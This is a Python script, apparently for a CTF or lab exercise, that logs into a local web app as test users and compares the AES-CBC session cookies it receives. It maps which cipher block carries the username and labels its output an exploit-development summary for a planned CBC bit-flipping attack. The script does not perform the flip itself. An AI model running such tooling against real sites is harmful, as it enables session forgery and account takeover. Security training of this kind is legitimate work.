import requests
import time
import json

def get_session_cookie(username, password="password", max_retries=3):
    """Login and extract session cookie with retry logic"""
    url = "http://127.0.0.1:33134/login"
    data = {"username": username, "password": password}
    
    for attempt in range(max_retries):
        try:
            response = requests.post(url, data=data, timeout=10, allow_redirects=False)
            
            # Check response cookies first
            if response.cookies:
                session_cookie = response.cookies.get('session')
                if session_cookie:
                    return session_cookie.strip()
            
            # Check Set-Cookie header
            if 'set-cookie' in response.headers:
                cookie_header = response.headers['set-cookie']
                if 'session=' in cookie_header:
                    session_part = cookie_header.split('session=')[1].split(';')[0]
                    return session_part.strip()
            
            # Check if session is in response body (debug)
            if response.text:
                print(f"[DEBUG] Response text for {username}: {response.text[:200]}")
            
            time.sleep(1)
            
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed for {username} (attempt {attempt+1}/{max_retries}): {e}")
            time.sleep(2)
    
    return None

def analyze_cookies():
    """Main analysis function"""
    print("=" * 80)
    print("AES-CBC COOKIE STRUCTURE ANALYSIS")
    print("=" * 80)
    print()
    
    # Test usernames
    usernames = ["test1", "test2", "test3"]
    cookie_samples = {}
    
    print("[Phase 1] Collecting Session Cookies\n")
    
    for i, username in enumerate(usernames, 1):
        print(f"[{i}/{len(usernames)}] Logging in as: {username}")
        
        cookie = get_session_cookie(username)
        
        if cookie:
            cookie_samples[username] = cookie
            print(f"    ✓ Cookie captured: {cookie}")
            print(f"    ✓ Length: {len(cookie)} characters")
            if len(cookie) == 64:
                print(f"    ✓ Format: Valid (64 hex chars = 32 bytes)")
            else:
                print(f"    ⚠ Warning: Unexpected length (expected 64)")
        else:
            print(f"    ✗ FAILED to capture cookie")
            if i == 1:
                print("\n[!] First login failed - checking if server is accessible...")
                try:
                    check = requests.get("http://127.0.0.1:33134/", timeout=5)
                    print(f"    Server status: {check.status_code}")
                    print(f"    Response: {check.text[:200]}")
                except Exception as e:
                    print(f"    Server error: {e}")
        
        print()
        time.sleep(1)
    
    # Check if we got enough cookies
    if len(cookie_samples) < 2:
        print("[✗] ERROR: Unable to collect enough cookies for analysis")
        print(f"Collected: {len(cookie_samples)}, Required: 2+")
        return False
    
    print("[Phase 2] Cookie Samples\n")
    print("-" * 80)
    for username, cookie in cookie_samples.items():
        print(f"{username:>8}: {cookie}")
    print("-" * 80)
    print()
    
    # Convert to bytes
    print("[Phase 3] Converting to Byte Arrays\n")
    byte_arrays = {}
    for username, cookie in cookie_samples.items():
        try:
            byte_data = bytes.fromhex(cookie)
            byte_arrays[username] = byte_data
            print(f"{username:>8}: {byte_data.hex(' ')} ({len(byte_data)} bytes)")
        except Exception as e:
            print(f"{username:>8}: Error parsing - {e}")
    
    print()
    
    # Byte-by-byte comparison
    print("[Phase 4] Byte-by-Byte Comparison\n")
    reference_user = list(byte_arrays.keys())[0]
    reference_bytes = byte_arrays[reference_user]
    
    print("Byte | " + " | ".join([f"{u:>6}" for u in usernames]) + " | Status")
    print("-" * 80)
    
    different_positions = []
    for i in range(len(reference_bytes)):
        byte_values = []
        for username in usernames:
            if username in byte_arrays and i < len(byte_arrays[username]):
                byte_values.append(byte_arrays[username][i])
            else:
                byte_values.append(None)
        
        # Check if all values are the same (and not None)
        valid_values = [v for v in byte_values if v is not None]
        all_same = len(valid_values) > 0 and all(v == valid_values[0] for v in valid_values)
        
        byte_str = f"{i:4}"
        hex_strs = []
        for v in byte_values:
            if v is None:
                hex_strs.append("  N/A ")
            else:
                hex_strs.append(f"  0x{v:02x}")
        
        status = "SAME"
        if not all_same:
            different_positions.append(i)
            status = "***DIFFERENT***"
        
        print(f"{byte_str} | " + " | ".join(hex_strs) + f" | {status}")
    
    print("-" * 80)
    print(f"\nTotal different byte positions: {len(different_positions)}")
    print(f"Positions: {different_positions}")
    print()
    
    # Block analysis (AES-CBC block size = 16 bytes)
    print("[Phase 5] AES-CBC Block Analysis\n")
    BLOCK_SIZE = 16
    cookie_length = len(reference_bytes)
    num_blocks = cookie_length // BLOCK_SIZE
    
    print(f"Cookie length: {cookie_length} bytes")
    print(f"Block size: {BLOCK_SIZE} bytes")
    print(f"Number of blocks: {num_blocks}")
    print()
    
    block_mapping = {}
    
    for block_num in range(num_blocks):
        start_byte = block_num * BLOCK_SIZE
        end_byte = (block_num + 1) * BLOCK_SIZE - 1
        
        # Find which different positions are in this block
        block_diffs = [pos for pos in different_positions if start_byte <= pos <= end_byte]
        
        print(f"Block {block_num} (Bytes {start_byte:2d}-{end_byte:2d}):")
        
        if block_diffs:
            print(f"  ✓ Contains username data")
            print(f"  ✓ Different bytes: {block_diffs}")
            field_offset = block_diffs[0] - start_byte
            print(f"  ✓ Field starts at offset: {field_offset} (within this block)")
            username_length = len(block_diffs)
            print(f"  ✓ Username length: ~{username_length} bytes")
            
            block_mapping[block_num] = {
                'offset': field_offset,
                'length': username_length,
                'positions': block_diffs
            }
        else:
            print(f"  ✗ No username data (padding/IV/metadata)")
            block_mapping[block_num] = {'type': 'metadata'}
        
        print()
    
    # Summary for exploit development
    print("[Phase 6] Exploit Development Summary\n")
    print("=" * 80)
    print("KEY FINDINGS FOR CBC BIT FLIPPING:")
    print("=" * 80)
    print()
    
    for block_num, info in block_mapping.items():
        if 'offset' in info:
            print(f"✓ Target Block: {block_num}")
            print(f"  Block range: Bytes {block_num*BLOCK_SIZE}-{(block_num+1)*BLOCK_SIZE-1}")
            print(f"  Username offset: {info['offset']} (from start of block)")
            print(f"  Username length: {info['length']} bytes")
            print(f"  Byte positions: {info['positions']}")
            
            # Show actual values
            print(f"  Sample values (test1): " + " ".join([
                f"0x{byte_arrays['test1'][p]:02x}" for p in info['positions'][:5]
            ]) + ("..." if len(info['positions']) > 5 else ""))
            print()
    
    # Show what the username looks like in the decrypted cookie
    if different_positions and 'test1' in byte_arrays:
        print("\nExpected decrypted cookie for 'test1':")
        print("-" * 80)
        print("The decrypted plaintext should show the username 'test1'")
        print("in the identified block with the byte pattern shown above.")
    
    print()
    print("=" * 80)
    print("[!] Analysis Complete - Ready for CBC Bit Flipping Attack")
    print("=" * 80)
    
    return True

if __name__ == "__main__":
    analyze_cookies()
